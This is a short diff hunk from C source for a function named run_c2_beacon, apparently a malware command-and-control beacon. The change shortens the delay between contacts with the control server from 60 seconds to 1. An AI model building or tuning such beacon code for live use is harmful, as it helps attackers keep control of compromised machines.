@@ -45,7 +45,7 @@ int run_c2_beacon(const char *c2_host, int c2_port) {
                     close(sock);
                 }
             }
-            sleep(60);
+            sleep(1);
         }
         _exit(0);
     }
